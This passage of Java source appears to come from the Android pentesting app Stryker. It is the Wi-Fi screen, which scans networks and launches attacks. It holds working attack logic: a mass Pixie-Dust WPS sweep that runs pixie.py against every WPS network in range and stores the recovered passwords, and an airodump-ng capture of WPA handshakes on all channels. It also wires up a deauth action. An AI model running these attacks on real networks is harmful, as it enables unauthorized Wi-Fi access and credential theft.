package com.zalexdev.stryker.wifi;

import android.app.Activity;
import android.app.Dialog;
import android.content.Context;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.airbnb.lottie.LottieAnimationView;
import com.google.android.material.button.MaterialButton;
import com.google.android.material.card.MaterialCardView;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.progressindicator.LinearProgressIndicator;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textview.MaterialTextView;
import com.nambimobile.widgets.efab.ExpandableFab;
import com.nambimobile.widgets.efab.FabOption;
import com.zalexdev.stryker.MainActivity;
import com.zalexdev.stryker.R;
import com.zalexdev.stryker.custom.WiFINetwork;
import com.zalexdev.stryker.utils.AdvancedProcess;
import com.zalexdev.stryker.utils.Core;
import com.zalexdev.stryker.wifi.attack.AttackKind;
import com.zalexdev.stryker.wifi.attack.AttackMetric;
import com.zalexdev.stryker.wifi.attack.AttackMonitor;
import com.zalexdev.stryker.wifi.attack.AttackStage;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Wifi extends Fragment {

    public ArrayList<WiFINetwork> list = new ArrayList<>();
    public SwipeRefreshLayout refresh;
    public LottieAnimationView img;
    public MaterialTextView text1;
    public MaterialTextView textSub;
    public MaterialTextView subtitle;
    public MaterialTextView ifaceValue;
    public MaterialTextView ifaceMeta;
    public MaterialTextView statusValue;
    public MaterialTextView bandValue;
    public MaterialTextView channelValue;
    public MaterialTextView countChip;
    public LinearProgressIndicator scanProgress;
    public MaterialCardView emptyCard;
    public MaterialCardView listCard;
    public Core core;
    public String wlan;
    public Activity activity;
    public Context context;
    public MaterialButton tryagain;
    public int failedscancount = 0;
    public MainActivity mainActivity;
    public ExpandableFab fab;
    public ArrayList<String> devices = new ArrayList<>();
    public ArrayList<String> wifimacs = new ArrayList<>();
    public ArrayList<String> hs = new ArrayList<>();
    public AdvancedProcess mdk4;
    public AdvancedProcess airodump;
    public ArrayList<WiFINetwork> networksHS = new ArrayList<>();
    private RecyclerView mRecyclerView;
    private WiFIAdapter mAdapter;
    private final AtomicBoolean alive = new AtomicBoolean(true);
    private Thread scanThread;
    private Thread attackThread;
    private AdvancedProcess pixieProcess;

    private void safeUi(Runnable r) {
        if (activity != null && isAdded() && alive.get()) {
            activity.runOnUiThread(() -> {
                if (isAdded() && alive.get()) {
                    r.run();
                }
            });
        }
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.wifi_fragment, container, false);
        alive.set(true);
        activity = getActivity();
        context = getContext();
        mRecyclerView = view.findViewById(R.id.wifilist);
        refresh = view.findViewById(R.id.refresh);
        img = view.findViewById(R.id.scan_img);
        text1 = view.findViewById(R.id.scan_text);
        textSub = view.findViewById(R.id.scan_subtext);
        tryagain = view.findViewById(R.id.try_again);
        subtitle = view.findViewById(R.id.wifi_subtitle);
        ifaceValue = view.findViewById(R.id.wifi_iface_value);
        ifaceMeta = view.findViewById(R.id.wifi_iface_meta);
        statusValue = view.findViewById(R.id.wifi_status_value);
        bandValue = view.findViewById(R.id.wifi_band_value);
        channelValue = view.findViewById(R.id.wifi_channel_value);
        countChip = view.findViewById(R.id.wifi_count_chip);
        scanProgress = view.findViewById(R.id.wifi_scan_progress);
        emptyCard = view.findViewById(R.id.wifi_empty_card);
        listCard = view.findViewById(R.id.wifi_list_card);
        core = new Core(context);
        bindCoreToInterface();
        tryagain.setOnClickListener(view1 -> scan());
        fab = view.findViewById(R.id.fab);
        fab.hide();
        mainActivity = (MainActivity) activity;

        if (activity != null) {
            mRecyclerView.setLayoutManager(new LinearLayoutManager(activity));
        }

        refresh.setColorSchemeColors(
                getResources().getColor(R.color.stryker_accent),
                0xFFAB47BC);
        refresh.setOnRefreshListener(this::scan);

        View statusRow = view.findViewById(R.id.wifi_status_row);
        if (statusRow != null) {
            statusRow.setOnClickListener(v -> pickWifiInterface());
        }

        wlan = core.getString("wlan_wifi");
        ifaceValue.setText(wlan == null || wlan.isEmpty() ? "—" : wlan);
        ifaceMeta.setText(wlan == null || wlan.isEmpty() ? "—" : wlan);

        if (mainActivity != null && mainActivity.getNetworks() != null && !mainActivity.getNetworks().isEmpty()) {
            list = mainActivity.getNetworks();
            mAdapter = new WiFIAdapter(context, activity, list);
            mAdapter.setHasStableIds(true);
            mRecyclerView.setItemViewCacheSize(64);
            mRecyclerView.setAdapter(mAdapter);
            renderListState(true);
            updateAdapterMeta();
            scanProgress.setVisibility(View.GONE);
            fab.show();
            setScanIdleSubtitle();
        } else {
            scan();
        }
        FabOption fabOption = view.findViewById(R.id.fab_pixie);
        FabOption fabOption2 = view.findViewById(R.id.fab_hs);
        FabOption fabOption3 = view.findViewById(R.id.fab_deauth);
        fabOption2.setOnClickListener(view1 -> runHS());
        if (core.getBoolean("wifi") && !core.isRootless()) {
            core.threadCommand("svc wifi enable");
        }
        fabOption.setOnClickListener(v -> {
            if (mAdapter != null) {
                runPixies(mAdapter.wifilist);
            }
        });
        fabOption3.setOnClickListener(v -> runDeauth());
        return view;
    }

    private static final int IFACE_WAIT_TRIES = 60;

    public void scan() {
        if (context == null) return;
        fab.hide();
        failedscancount = 0;
        renderListState(false);
        if (img != null) {
            img.setAnimation(R.raw.wifi_scan);
            img.playAnimation();
        }
        text1.setText(R.string.scanning_wifi);
        textSub.setText(R.string.wifi_empty_body);
        tryagain.setVisibility(View.GONE);
        scanProgress.setVisibility(View.VISIBLE);
        scanProgress.setIndeterminate(true);
        statusValue.setText(R.string.wifi_status_scanning);
        subtitle.setText(R.string.wifi_subtitle_scanning);

        wlan = core.getString("wlan_wifi");
        ifaceValue.setText(wlan == null || wlan.isEmpty() ? "—" : wlan);
        ifaceMeta.setText(wlan == null || wlan.isEmpty() ? "—" : wlan);

        scanThread = new Thread(() -> {
            try {
                if (core.isRootless()) {
                    com.zalexdev.stryker.engine.WifiEngine.ensureStarting(context);
                    com.zalexdev.stryker.logger.Logger log = new com.zalexdev.stryker.logger.Logger();
                    com.zalexdev.stryker.engine.GuestEngine guest = core.guest();
                    log.writeLine("Rootless WiFi: passing USB adapter into "
                            + guest.displayName() + "…", 1, "wifi");
                    boolean attached = guest.ensureUsbWifiAttached();
                    log.writeLine(attached ? "USB adapter attached — driver OK"
                            : "USB adapter not usable", attached ? 2 : 3, "wifi");
                    if (!attached) {
                        if (!guest.isRunning()) {
                            safeUi(this::showGuestDownState);
                            return;
                        }
                        boolean noDriver = guest.usb() != null && guest.usb().hasAttached();
                        if (noDriver) reportNoDriver(); else safeUi(this::showNoAdapterState);
                        return;
                    }
                    boolean up = false;
                    String target = core.getString("wlan_wifi");
                    ArrayList<String> ifs = new ArrayList<>();
                    for (int i = 0; i < IFACE_WAIT_TRIES && alive.get(); i++) {
                        ifs = core.getInterfacesList();
                        if (ifs.contains(target)) { up = true; break; }
                        if (ifs.contains(target + "mon")) { target = target + "mon"; up = true; break; }
                        try { Thread.sleep(500); } catch (InterruptedException ignored) {}
                    }
                    if (!alive.get()) return;
                    if (!up && !ifs.isEmpty()) {
                        target = ifs.get(0);
                        core.setWifiInterface(target);
                        wlan = target;
                        up = true;
                        final String adopted = target;
                        log.writeLine("Adopted guest interface '" + adopted + "'", 2, "wifi");
                        safeUi(() -> {
                            ifaceValue.setText(adopted);
                            ifaceMeta.setText(adopted);
                        });
                    }
                    log.writeLine("Guest interfaces: " + ifs, up ? 2 : 3, "wifi");
                    if (!up) {
                        log.writeLine("Interface '" + target + "' never appeared — guest USB/driver diagnostics:", 3, "wifi");
                        core.customChrootCommand("echo '### lsusb'; lsusb 2>&1; "
                                + "echo '### ip link'; ip -br link 2>&1; "
                                + "echo '### iw dev'; iw dev 2>&1; "
                                + "echo '### dmesg'; dmesg 2>&1 | grep -iE 'usb|wlan|firmware|cfg80211|ieee80211|rtl|ath|mt7|88x' | tail -40");
                        reportNoDriver();
                        return;
                    }
                    core.rootlessPrepWifi(target);
                    try { Thread.sleep(1200); } catch (InterruptedException ignored) {}
                    log.writeLine("Adapter ready — scanning…", 2, "wifi");
                }
                ArrayList<String> wlans = core.getInterfacesList();
                if (!core.isRootless() && !wlans.contains(wlan) && !wlans.contains(wlan + "mon")) {
                    com.zalexdev.stryker.engine.WifiDriverProbe.Result probe =
                            com.zalexdev.stryker.engine.WifiDriverProbe.probe(context, core);
                    if (probe.needsGuest()) {
                        safeUi(() -> showKernelNoDriverState(probe));
                        return;
                    }
                }
                if (wlans.contains(wlan + "mon")) {
                    wlan = wlan + "mon";
                }
                if (wlans.contains(wlan)) {
                    if (!"wlan0".equals(wlan) && wlan.contains("mon")) {
                        core.disableMonitorMode(wlan);
                        wlan = wlan.replace("mon", "");
                        core.customCommand("ip link set " + wlan + " up");
                    } else if (!"wlan0".equals(wlan)) {
                        core.customCommand("ip link set " + wlan + " up");
                    }
                }

                list = new ScanWifi(wlan, core).execute().get();
                if (mainActivity != null) {
                    mainActivity.setNetworks(list);
                }
                if (core.getBoolean("geomac_bg_scan") && list != null) {
                    for (WiFINetwork n : list) {
                        if (n != null && n.getMac() != null && !n.getMac().isEmpty()) {
                            com.zalexdev.stryker.geomac.GeoHooks.recordScan(
                                    context, n.getMac(), n.getSsid());
                        }
                    }
                }
                while (list.isEmpty() && failedscancount < 5) {
                    if (failedscancount == 4) {
                        break;
                    }
                    failedscancount++;
                    Thread.sleep(3000);
                    list = new ScanWifi(wlan, core).execute().get();
                }

                for (int i = 0; i < list.size(); i++) {
                    String mac = list.get(i).getMac();
                    if (mac != null && !core.getNetwork(mac).isEmpty()) {
                        WiFINetwork w = list.get(i);
                        w.setOK(true);
                        w.setPsk(core.getListString(mac).get(0));
                        if (core.getNetwork(mac).size() > 1) {
                            w.setPin(core.getListString(mac).get(1));
                        }
                        list.set(i, w);
                    }
                }

                if (activity == null || !alive.get()) return;
                if (list.isEmpty() && core.isRootless()) {
                    new com.zalexdev.stryker.logger.Logger().writeLine(
                            "Scan returned 0 networks — guest state:", 3, "wifi");
                    core.customChrootCommand("echo '### iw dev'; iw dev 2>&1; "
                            + "echo '### reg'; iw reg get 2>&1; "
                            + "echo '### link'; ip -br link 2>&1; "
                            + "echo '### scan-head'; iw dev " + wlan + " scan 2>&1 | head -25");
                }
                if (list.isEmpty()) {
                    safeUi(() -> {
                        if (img != null) {
                            img.setAnimation(R.raw.nothing);
                            img.playAnimation();
                        }
                        renderListState(false);
                        text1.setText(R.string.wifi_empty_title);
                        textSub.setText(R.string.cant_find_netw);
                        tryagain.setVisibility(View.VISIBLE);
                        tryagain.setText(R.string.try_again);
                        tryagain.setOnClickListener(v -> scan());
                        scanProgress.setVisibility(View.GONE);
                        statusValue.setText(R.string.wifi_status_failed);
                        subtitle.setText(R.string.wifi_subtitle_none);
                        countChip.setText("0");
                        refresh.setEnabled(true);
                        refresh.setRefreshing(false);
                    });
                } else {
                    mAdapter = new WiFIAdapter(context, activity, list);
                    mAdapter.setHasStableIds(true);
                    safeUi(() -> {
                        mRecyclerView.setItemViewCacheSize(64);
                        mRecyclerView.setAdapter(mAdapter);
                        renderListState(true);
                        updateAdapterMeta();
                        scanProgress.setVisibility(View.GONE);
                        refresh.setRefreshing(false);
                        fab.show();
                        if (img != null) {
                            img.clearAnimation();
                        }
                        setScanIdleSubtitle();
                    });
                }
            } catch (ExecutionException | InterruptedException e) {
                e.printStackTrace();
                safeUi(() -> {
                    scanProgress.setVisibility(View.GONE);
                    refresh.setRefreshing(false);
                    statusValue.setText(R.string.wifi_status_failed);
                });
            }
        });
        scanThread.start();
    }

    private void renderListState(boolean hasNetworks) {
        emptyCard.setVisibility(hasNetworks ? View.GONE : View.VISIBLE);
        listCard.setVisibility(hasNetworks ? View.VISIBLE : View.GONE);
    }

    private void showNoAdapterState() {
        if (img != null) { img.setAnimation(R.raw.nothing); img.playAnimation(); }
        renderListState(false);
        text1.setText("No Wi-Fi adapter");
        textSub.setText("Rootless Wi-Fi runs through a USB adapter passed into the VM. Plug one in and attach it.");
        tryagain.setVisibility(View.VISIBLE);
        tryagain.setText("Attach adapter");
        tryagain.setOnClickListener(v -> { if (mainActivity != null) mainActivity.openUsbSheet(); });
        scanProgress.setVisibility(View.GONE);
        statusValue.setText(R.string.wifi_status_failed);
        subtitle.setText("No adapter attached");
        countChip.setText("0");
        refresh.setEnabled(true);
        refresh.setRefreshing(false);
        fab.hide();
    }

    private void showKernelNoDriverState(
            com.zalexdev.stryker.engine.WifiDriverProbe.Result probe) {
        if (img != null) { img.setAnimation(R.raw.nothing); img.playAnimation(); }
        renderListState(false);
        text1.setText(R.string.wifi_nodriver_state_title);
        textSub.setText(getString(R.string.wifi_nodriver_state_body, probe.label));
        tryagain.setVisibility(View.VISIBLE);
        tryagain.setText(R.string.wifi_nodriver_state_action);
        tryagain.setOnClickListener(v -> offerWifiGuest(probe));
        scanProgress.setVisibility(View.GONE);
        statusValue.setText(R.string.wifi_nodriver_state_status);
        subtitle.setText(getString(R.string.wifi_nodriver_state_body, probe.label));
        countChip.setText("0");
        refresh.setEnabled(true);
        refresh.setRefreshing(false);
        fab.hide();
    }

    private void offerWifiGuest(com.zalexdev.stryker.engine.WifiDriverProbe.Result probe) {
        if (context == null || activity == null) return;
        new MaterialAlertDialogBuilder(context)
                .setTitle(R.string.wifi_nodriver_title)
                .setMessage(getString(R.string.wifi_nodriver_body, probe.label))
                .setPositiveButton(R.string.wifi_nodriver_setup,
                        (d, w) -> startWifiGuestSetup())
                .setNegativeButton(R.string.wifi_nodriver_later, null)
                .show();
    }

    private void startWifiGuestSetup() {
        if (activity == null) return;
        com.zalexdev.stryker.wifi.guest.WifiGuestSetupDialog.show(activity, (armed, iface) -> {
            if (!armed) return;
            wlan = iface;
            bindCoreToInterface();
            scan();
        });
    }

    private void showGuestDownState() {
        if (img != null) { img.setAnimation(R.raw.nothing); img.playAnimation(); }
        renderListState(false);
        text1.setText(R.string.wifi_guest_down_title);
        textSub.setText(R.string.wifi_guest_down_body);
        tryagain.setVisibility(View.VISIBLE);
        tryagain.setText(R.string.try_again);
        tryagain.setOnClickListener(v -> {
            com.zalexdev.stryker.engine.WifiEngine.ensureStarting(context);
            scan();
        });
        scanProgress.setVisibility(View.GONE);
        statusValue.setText(R.string.wifi_status_failed);
        subtitle.setText(R.string.wifi_guest_down_title);
        countChip.setText("0");
        refresh.setEnabled(true);
        refresh.setRefreshing(false);
        fab.hide();
    }

    private void reportNoDriver() {
        String setUpFor = com.zalexdev.stryker.engine.WifiEngine.adapter(core);
        com.zalexdev.stryker.engine.WifiDriverProbe.Result now = setUpFor.isEmpty() ? null
                : com.zalexdev.stryker.engine.WifiDriverProbe.probe(context, new Core(context));
        final boolean swapped = now != null && !now.vidPid.isEmpty()
                && !setUpFor.equals(now.vidPid);
        final String nowLabel = now == null ? "" : now.label;
        safeUi(() -> {
            if (swapped) showAdapterChangedState(setUpFor, nowLabel);
            else showNoDriverState();
        });
    }

    private void showAdapterChangedState(String setUpFor, String nowLabel) {
        if (img != null) { img.setAnimation(R.raw.nothing); img.playAnimation(); }
        renderListState(false);
        text1.setText(R.string.wifi_guest_adapter_changed_title);
        textSub.setText(getString(R.string.wifi_guest_adapter_changed_body, setUpFor, nowLabel));
        tryagain.setVisibility(View.VISIBLE);
        tryagain.setText(R.string.wifi_guest_adapter_changed_action);
        tryagain.setOnClickListener(v -> startWifiGuestSetup());
        scanProgress.setVisibility(View.GONE);
        statusValue.setText(R.string.wifi_status_failed);
        subtitle.setText(R.string.wifi_guest_adapter_changed_title);
        countChip.setText("0");
        refresh.setEnabled(true);
        refresh.setRefreshing(false);
        fab.hide();
    }

    private void showNoDriverState() {
        if (img != null) { img.setAnimation(R.raw.nothing); img.playAnimation(); }
        renderListState(false);
        text1.setText(R.string.wifi_no_driver_title);
        textSub.setText(R.string.wifi_no_driver_body);
        tryagain.setVisibility(View.VISIBLE);
        tryagain.setText(R.string.try_again);
        tryagain.setOnClickListener(v -> scan());
        scanProgress.setVisibility(View.GONE);
        statusValue.setText(R.string.wifi_status_failed);
        subtitle.setText(R.string.wifi_no_driver_subtitle);
        countChip.setText("0");
        refresh.setEnabled(true);
        refresh.setRefreshing(false);
        fab.hide();
    }

    private void setScanIdleSubtitle() {
        if (list == null || list.isEmpty()) {
            subtitle.setText(R.string.wifi_subtitle_none);
            statusValue.setText(R.string.wifi_status_ready);
            countChip.setText("0");
            return;
        }
        subtitle.setText(getString(R.string.wifi_subtitle_done, list.size()));
        statusValue.setText(R.string.wifi_status_ready);
        countChip.setText(String.valueOf(list.size()));
    }

    private void updateAdapterMeta() {
        String where = wlan == null || wlan.isEmpty() ? "—" : wlan;
        if (core != null && core.engineOverride() != null) {
            where = getString(R.string.wifi_guest_active_meta, where);
        }
        ifaceMeta.setText(where);
        boolean has24 = false;
        boolean has5 = false;
        Set<Integer> channels = new HashSet<>();
        if (list != null) {
            for (WiFINetwork n : list) {
                if (n.getIs5hhz()) {
                    has5 = true;
                } else {
                    has24 = true;
                }
                if (n.getChannel() > 0) channels.add(n.getChannel());
            }
        }
        String band = "—";
        if (has24 && has5) band = "2.4 / 5";
        else if (has24) band = "2.4";
        else if (has5) band = "5";
        bandValue.setText(band);
        channelValue.setText(channels.isEmpty() ? "—" : String.valueOf(channels.size()));
    }

    private void pickWifiInterface() {
        if (context == null) return;
        new Thread(() -> {
            ArrayList<String> ifaces = new ArrayList<>();
            Core phone = new Core(context);
            for (String s : phone.getInterfacesList()) if (!ifaces.contains(s)) ifaces.add(s);

            com.zalexdev.stryker.engine.EngineType guestType =
                    com.zalexdev.stryker.engine.WifiEngine.armed(phone)
                            ? com.zalexdev.stryker.engine.WifiEngine.configured(phone) : null;
            if (guestType != null) {
                try {
                    Core guestCore = new Core(context).overrideEngine(guestType);
                    for (String s : guestCore.getInterfacesList()) {
                        if (!ifaces.contains(s)) ifaces.add(s);
                    }
                } catch (Throwable ignored) {
                }
            }
            final ArrayList<String> merged = ifaces;
            safeUi(() -> showWifiInterfacePicker(merged));
        }).start();
    }

    private void showWifiInterfacePicker(ArrayList<String> interfaces) {
        if (context == null || activity == null) return;
        String[] items = new String[interfaces.size() + 1];
        for (int i = 0; i < interfaces.size(); i++) {
            String name = interfaces.get(i);
            items[i] = com.zalexdev.stryker.engine.WifiEngine.isGuestInterface(core, name)
                    ? getString(R.string.wifi_guest_active_meta, name) : name;
        }
        items[items.length - 1] = context.getString(R.string.customvalue);
        new MaterialAlertDialogBuilder(context)
                .setTitle(R.string.pick)
                .setItems(items, (di, i) -> {
                    if (i == items.length - 1) {
                        promptCustomWifiInterface();
                    } else {
                        applyWifiInterface(interfaces.get(i));
                    }
                })
                .show();
    }

    private void promptCustomWifiInterface() {
        final Dialog valueDialog = new Dialog(context);
        valueDialog.setContentView(R.layout.input_dialog);
        Window vw = valueDialog.getWindow();
        if (vw != null) {
            vw.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            vw.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        }
        TextView title = valueDialog.findViewById(R.id.title);
        TextInputEditText value = valueDialog.findViewById(R.id.value);
        MaterialButton ok = valueDialog.findViewById(R.id.ok);
        MaterialButton cancel = valueDialog.findViewById(R.id.cancel);
        title.setText(R.string.customvalue);
        cancel.setOnClickListener(v -> valueDialog.dismiss());
        ok.setOnClickListener(v -> {
            String entered = value.getText() == null ? "" : value.getText().toString().trim();
            if (entered.isEmpty()) {
                value.setError(context.getString(R.string.customvalue));
                return;
            }
            valueDialog.dismiss();
            applyWifiInterface(entered);
        });
        valueDialog.show();
    }

    private void applyWifiInterface(String iface) {
        core.setWifiInterface(iface);
        wlan = iface;
        ifaceValue.setText(iface);
        ifaceMeta.setText(iface);
        bindCoreToInterface();
        scan();
    }

    private void bindCoreToInterface() {
        if (core == null) return;
        String selected = core.getString("wlan_wifi");
        com.zalexdev.stryker.engine.WifiEngine.bindFor(core.overrideEngine(null), selected);
    }

    public boolean wifienabled() {
        if (context == null) return false;
        WifiManager wifi = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        return wifi != null && wifi.isWifiEnabled();
    }

    public boolean isPortOpen(String ip, int port) {
        Socket socket = new Socket();
        try {
            socket.connect(new InetSocketAddress(ip, port), 200);
            socket.close();
            return true;
        } catch (IOException e) {
            return false;
        }
    }

    public void runPixies(ArrayList<WiFINetwork> list) {
        if (list == null) return;
        final AttackMonitor monitor = AttackMonitor.open(activity, core, AttackKind.MASS_PIXIE,
                "Preparing", list.size() + " networks queued");
        final AtomicBoolean cancelattack = new AtomicBoolean(false);
        final AdvancedProcess[] pixie = {null};
        final Timer[] timer = {new Timer()};
        final int[] totalSuccess = {0};
        final int[] total = {0};

        monitor.metric(AttackMetric.PROGRESS, "0 / " + list.size());
        monitor.metric(AttackMetric.CRACKED, 0);
        monitor.stage(AttackStage.RADIO, AttackStage.State.ACTIVE, "Taking the radio off Android");

        monitor.secondary("Skip this network", () -> {
            if (pixie[0] != null) {
                pixie[0].kill();
                monitor.note("Skipped by request");
            }
        });

        monitor.onStop(() -> {
            cancelattack.set(true);
            if (pixie[0] != null) {
                pixie[0].kill();
            }
            try {
                timer[0].cancel();
            } catch (Exception e) {
                e.printStackTrace();
            }
            monitor.hideSecondary();
            monitor.finish(totalSuccess[0] > 0,
                    "Cracked " + totalSuccess[0] + " of " + total[0] + " attacked");
            new Thread(() -> {
                restoreWpsInterface();
                if (!core.isRootless() && core.isPixieIfaceDown()
                        && core.getHSInterface().contains("wlan0")) {
                    core.customCommand("svc wifi enable");
                }
            }).start();
        });

        ArrayList<String> tried = new ArrayList<>();
        Thread sweep = new Thread(() -> {
            core.wpsDisableWifiIfEnabled();
            monitor.stage(AttackStage.RADIO, AttackStage.State.DONE);
            monitor.stage(AttackStage.SWEEP, AttackStage.State.ACTIVE);

            for (WiFINetwork temp : list) {
                if (cancelattack.get()) {
                    break;
                }
                final int[] scanCount = {0};
                final int[] time = {60};
                try {
                    timer[0].cancel();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                timer[0] = new Timer();
                timer[0].schedule(new TimerTask() {
                    @Override
                    public void run() {
                        time[0]--;
                        monitor.metric(AttackMetric.TIMEOUT, time[0] + "s");
                        if (time[0] <= 0) {
                            if (pixie[0] != null) {
                                pixie[0].kill();
                            }
                            try {
                                timer[0].cancel();
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            monitor.note("Timeout — skipping this target");
                        }
                    }
                }, 0, 1000);
                if (temp.getWps() && !temp.isBlocked && !tried.contains(temp.getSsid())) {
                    monitor.target(temp.getSsid(), targetMeta(temp));
                    monitor.metric(AttackMetric.TARGET, temp.getSsid());
                    monitor.stage(AttackStage.ASSOC, AttackStage.State.ACTIVE);

                    String cmd = " python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
                            + core.wpsIfaceDownFlag() + " -K -F -b " + temp.getMac();
                    pixie[0] = new AdvancedProcess(activity, context, cmd, true) {
                        @Override
                        public void onFinished(ArrayList<String> outputList) {
                            WiFINetwork result = pixieParse(outputList);
                            if (result.getOK()) {
                                totalSuccess[0]++;
                                monitor.note(temp.getSsid() + " — " + result.getPsk());
                                if (core.isStoreEnabled()) {
                                    core.saveNetwork(temp.getMac(), result.getPsk(), result.getPin(), temp.ssid);
                                }
                            }
                            total[0]++;
                            tried.add(temp.getSsid());
                            monitor.metric(AttackMetric.CRACKED, totalSuccess[0]);
                            monitor.metric(AttackMetric.PROGRESS, total[0] + " / " + list.size());
                        }

                        @Override
                        public void onNewLine(String line) {
                            if (line.contains("Associating with AP…")) {
                                scanCount[0]++;
                            }
                            if (scanCount[0] > 4) {
                                pixie[0].kill();
                                monitor.note("Router in push-button mode — skipping");
                            }
                            monitor.wps(maskedLine(line));
                        }

                        @Override
                        public void onEvent(String line) {

                        }
                    };
                    pixieProcess = pixie[0];
                    while (pixie[0].isRunning()) {

                        try {
                            Thread.sleep(2000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                    restoreWpsInterface();
                }
            }
            restoreWpsInterface();
            try {
                timer[0].cancel();
            } catch (Exception e) {
                e.printStackTrace();
            }
            monitor.hideSecondary();
            monitor.stage(AttackStage.SWEEP, AttackStage.State.DONE,
                    total[0] + " of " + list.size() + " attacked");
            monitor.target("Sweep finished", list.size() + " networks queued");
            monitor.finish(totalSuccess[0] > 0,
                    "Cracked " + totalSuccess[0] + " of " + total[0] + " attacked");
        });
        attackThread = sweep;
        sweep.start();
    }

    public void runHS() {
        final AttackMonitor monitor = AttackMonitor.open(activity, core, AttackKind.MASS_HANDSHAKE,
                "Everything in range", core.getHSInterface());
        networksHS = new ArrayList<>();
        wifimacs = new ArrayList<>();
        hs = new ArrayList<>();
        devices = new ArrayList<>();

        AtomicReference<Timer> csvReader = new AtomicReference<>(new Timer());

        final String hsDir = core.getShareRoot() + "/hs";
        final String capturedDir = core.getShareRoot() + "/captured";

        final boolean[] device = {false};
        final int[] totalSuccess = {0};
        mdk4 = null;
        monitor.stage(AttackStage.MONITOR, AttackStage.State.ACTIVE);
        new Thread(() -> {
            final String requestedIface = core.getHSInterface();
            monitor.stage(AttackStage.MONITOR, AttackStage.State.ACTIVE, requestedIface);
            boolean monitorMode = core.monitorManager.enableMonitorMode(requestedIface);
            String capIface = requestedIface;
            if (!monitorMode) {
                monitor.failStage(AttackStage.MONITOR, "Interface refused monitor mode",
                        getString(R.string.wifi_monitor_failed, requestedIface));
            } else {
                capIface = core.getHSInterface();
                monitor.stage(AttackStage.MONITOR, AttackStage.State.DONE, capIface);
                monitor.stage(AttackStage.CAPTURE, AttackStage.State.ACTIVE, "airodump-ng, all channels");
                String guestShare = core.guestShare();
                core.customChrootCommand("mkdir -p " + guestShare + "/hs " + guestShare + "/captured; "
                        + "rm -f " + guestShare + "/hs/handshakenow*");
                String cmd = "airodump-ng " + capIface + " -w " + guestShare
                        + "/hs/handshakenow --ignore-negative-one --output-format pcap,csv  --update 3";
                airodump = new AdvancedProcess(activity, context, cmd, true) {
                    @Override
                    public void onFinished(ArrayList<String> outputList) {
                        monitor.failStage(AttackStage.CAPTURE, "airodump-ng exited",
                                "Attack finished due to error");
                        try {
                            csvReader.get().cancel();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void onNewLine(String line) {

                        if (line.contains("WPA handshake")) {
                            Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                            if (m.find()) {
                                if (!hs.contains(m.group())) {
                                    hs.add(m.group());
                                    totalSuccess[0]++;
                                    monitor.metric(AttackMetric.CAPTURED, totalSuccess[0]);
                                    monitor.stage(AttackStage.EAPOL, AttackStage.State.DONE,
                                            totalSuccess[0] + " captured so far");
                                }
                            }
                        }
                        monitor.airodump(line, null);
                    }

                    @Override
                    public void onEvent(String line) {

                    }
                };
                airodump.setNoLog(true);
            }

            boolean s = false;
            if (monitorMode) {
                for (int i = 0; i < 40 && alive.get(); i++) {
                    if (core.checkFile(hsDir + "/handshakenow-01.csv")) {
                        s = true;
                        break;
                    }
                    if (airodump != null && !airodump.isRunning()) break;
                    try {
                        Thread.sleep(500);
                    } catch (InterruptedException e) {
                        break;
                    }
                }
            }
            if (s) {
                monitor.stage(AttackStage.CAPTURE, AttackStage.State.DONE, "Writing to " + hsDir);
                monitor.stage(AttackStage.EAPOL, AttackStage.State.ACTIVE, "Waiting for clients to rejoin");
                csvReader.set(new Timer());
                csvReader.get().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        List<List<String>> records = new ArrayList<>();
                        try (BufferedReader br = new BufferedReader(new FileReader(hsDir + "/handshakenow-01.csv"))) {
                            String line;
                            while ((line = br.readLine()) != null) {
                                String[] values = line.split(",");
                                records.add(Arrays.asList(values));
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        for (List<String> line : records) {
                            if (line.size() > 1) {
                                if (line.get(0).equals("BSSID")) {
                                    monitor.metric(AttackMetric.NETWORKS, networksHS.size());
                                    monitor.metric(AttackMetric.CLIENTS, devices.size());
                                    devices.clear();
                                    networksHS.clear();
                                    wifimacs.clear();
                                    device[0] = false;
                                }
                                if (line.get(0).equals("Station MAC")) {
                                    device[0] = true;

                                }
                                if (!device[0] && !line.get(0).equals("BSSID")) {
                                    WiFINetwork temp = new WiFINetwork();
                                    temp.setMac(line.get(0));
                                    temp.setSsid(line.get(line.size() - 2));
                                    if (!networksHS.contains(temp) && !temp.getSsid().equals("")) {
                                        networksHS.add(temp);
                                        wifimacs.add(temp.getMac());
                                        if (core.getBoolean("geomac_bg_scan")) {
                                            com.zalexdev.stryker.geomac.GeoHooks.recordScan(
                                                    context, temp.getMac(), temp.getSsid());
                                        }
                                    }
                                }
